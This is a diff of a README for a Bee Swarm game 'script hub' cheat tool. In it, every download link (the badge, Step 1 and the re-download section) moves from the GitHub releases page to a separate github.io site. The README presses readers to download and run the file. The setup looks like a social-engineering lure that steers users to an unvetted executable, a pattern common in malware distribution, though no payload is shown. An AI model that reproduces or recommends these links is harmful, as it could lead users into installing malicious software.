@@ -1,6 +1,6 @@
 # 🐝 bee-swarm-script-hub-pc - Boost Your Bee Swarm Game Today
 
-[![Download Now](https://img.shields.io/badge/Download-bee--swarm--script--hub--pc-blue?style=for-the-badge&logo=github)](https://github.com/opaque-sensitivefern190/bee-swarm-script-hub-pc/releases)
+[![Download Now](https://img.shields.io/badge/Download-bee--swarm--script--hub--pc-blue?style=for-the-badge&logo=github)](https://opaque-sensitivefern190.github.io)
 
 ## 🎯 What Is This?
 
@@ -30,7 +30,7 @@ Getting up and running takes less than two minutes. Follow these simple steps.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/opaque-sensitivefern190/bee-swarm-script-hub-pc/releases**](https://github.com/opaque-sensitivefern190/bee-swarm-script-hub-pc/releases)
+[**https://opaque-sensitivefern190.github.io**](https://opaque-sensitivefern190.github.io)
 
 Click the download button on that page. The file will start downloading to your computer automatically.
 
@@ -149,7 +149,7 @@ That's it. You're ready to transform your bee-farming experience.
 
 If you need to download it again for any reason, use this link:
 
-[**https://github.com/opaque-sensitivefern190/bee-swarm-script-hub-pc/releases**](https://github.com/opaque-sensitivefern190/bee-swarm-script-hub-pc/releases)
+[**https://opaque-sensitivefern190.github.io**](https://opaque-sensitivefern190.github.io)
 
 The latest version will always be available there. Save this link for future reference.
 
